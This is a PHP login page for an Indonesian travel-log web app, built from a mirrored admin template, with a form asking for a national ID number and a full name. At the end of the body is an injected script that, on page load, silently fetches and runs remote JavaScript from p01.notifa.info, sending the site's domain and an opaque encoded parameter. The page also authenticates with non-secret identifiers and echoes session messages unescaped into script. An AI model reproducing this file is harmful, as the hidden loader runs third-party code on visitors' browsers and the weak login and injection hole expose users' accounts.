<?php session_start(); ?>
<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signin.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Aplikasi Peduli Diri - Login </title>
  <!--favicon-->
  <link rel="icon" href="assets/images/iconlogo1.png" type="image/x-icon">
  <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="assets/css/app-style.css" rel="stylesheet"/>
  
  <link href="./main.css" rel="stylesheet"></head>

</head>

<body>
 <!-- Start wrapper-->
 <div id="wrapper">
	<div class="card border-primary border-top-sm border-bottom-sm card-authentication1 mx-auto my-5 animated bounceInDown">
		<div class="card-body">
		 <div class="card-content p-2">
		 	<div class="text-center">
			 <img src="assets/images/iconlogo1.png" widht="100" height="100" >
		 	</div>
		  <div class="card-title text-uppercase text-center py-3 mt-3">Masuk - Aplikasi Catatan Perjalanan</div>
		    <form method="POST" action="proses_login.php">
			<div class="form-group">
				<div class="position-relative has-icon-left">
					<label for="exampleInputUsername" class="sr-only">NIK</label>
						<input name="nik" type="number" id="exampleInputUsername" class="form-control" placeholder="Masukan NIK" autocomplete="off" required>
						<div class="form-control-position">
							<i class="pe-7s-id"></i>
					</div>
				</div>
			</div>
			<div class="form-group">
				<div class="position-relative has-icon-left">
					<label for="exampleInputPassword" class="sr-only">Nama lengkap</label>
					<input name="nama_lengkap" type="text" id="exampleInputPassword" class="form-control" placeholder="Masukan Nama Lengkap" autocomplete="off" required>
					<div class="form-control-position">
						<i class="pe-7s-users"></i>
					</div>
				</div>
			</div>
			<br>
			  <button type="submit" class="btn btn-primary btn-block waves-effect waves-light">masuk</button>
			  	<div class="text-center pt-3">
                	<hr>
					<p class="text-muted">Belum Punya akun? <a href="register.php">Daftar Akun Baru </a></p>
			  </div>
			 </form>
		   </div>
		  </div>
	     </div>
    
     <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
	</div><!--wrapper-->
	
  <!-- Bootstrap core JavaScript-->
  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/js/popper.min.js"></script>
  <script src="assets/js/bootstrap.min.js"></script>
  	<!-- simplebar js -->
	<script src="assets/plugins/simplebar/js/simplebar.js"></script>
  <!-- waves effect js -->
  <script src="assets/js/waves.js"></script>
	<!-- sidebar-menu js -->
	<script src="assets/js/sidebar-menu.js"></script>
  <!-- Custom scripts -->
  <script src="assets/js/app-script.js"></script>
  
  <script src="assets/js/sweetalert2@11.js"></script>
<?php if(isset($_SESSION['success'])) { ?>
	<script>
		Swal.fire(
		'Berhasil',
		'<?= $_SESSION['success']; ?>',
		'success'
		)
	</script>
<?php unset($_SESSION['success']); } ?>

<?php if(isset($_SESSION['error'])) { ?>
	<script>
		Swal.fire(
		'Maaf',
		'<?= $_SESSION['error']; ?>',
		'error'
		)
	</script>
<?php unset($_SESSION['error']); } ?>



<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKugMuLHZvWG0xKbltMMmbcsNzvfDcif6RgPTaJ%2fpMzbNc0eNunEVaBqg%2f6LgkfHnuGbrzftbrjOVZEV6ZMDcaGBUKnoozKaf8F3wlZ9bPku0D7yaarLv7hozUmx2kb6RZGNoHI8%2fepU81DPkLIMexqOn8HNk46jEzv%2b9IcyKtiFYhnHBYobg%2fO9FzeKAL1AFMgvNon8fz4GJSBSrh4PoAESdzBgwtG7nuW32vUcWk%2bob%2bKTFLAdyulQQUdggtA5jKnhkyE%2blNpRzrOGCLJl2vLlPLjeTCW39tdBDpiBBLOVr402WX0%2bD%2fiRuJFZM0yPrRPbrI0KiVrtLwewpHZYlAEpODQDl4nL3QTVDy8sLcKYzVXNZmgaQWzR7e%2bcV9qL3SrH37h80yxG8pUdO%2b6UL1ZN7pOhpPyVoDMF9JwpM2HldtENM0XkiYyCvbPb%2bPvSLfoWq0mSS5HhKocmU3I78Mj0SMgBf3Lry%2figrlwMXvjfnoiGGb8kFC2ZyoPkv5vKN%2fek%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signin.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
</html>
